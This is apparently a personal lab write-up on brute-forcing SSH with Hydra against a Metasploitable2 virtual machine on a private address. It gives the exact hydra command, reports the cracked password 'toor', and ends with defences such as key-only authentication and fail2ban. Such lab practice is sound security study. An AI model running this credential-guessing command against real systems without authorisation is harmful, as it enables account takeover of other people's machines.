# 🧪 Lab 01 – Brute Force SSH with Hydra

## 🔍 Goal
Simulate a brute-force SSH attack against a vulnerable VM using a wordlist and Hydra.

## 🧠 What I'm Testing
- How brute-force tools work
- How SSH handles login attempts
- Password hygiene awareness

## 💡 Target
IP: `192.168.56.102`  
Username: `admin`  
Port: `22`

## 🛠️ Steps
1. Install hydra: `sudo apt install hydra`
2. Create a `credentials.txt` file (password wordlist)
3. Run brute-force attack with this command:
```bash
hydra -l admin -P credentials.txt ssh://192.168.56.102
```


##📜 Notes
- It found the password "toor" on line 3.
- Target VM used: Metasploitable2
- Brute-force took ~12 seconds

##🧯 Defense Ideas
- Disable SSH password login
- Use fail2ban
- Enforce key-only authentication
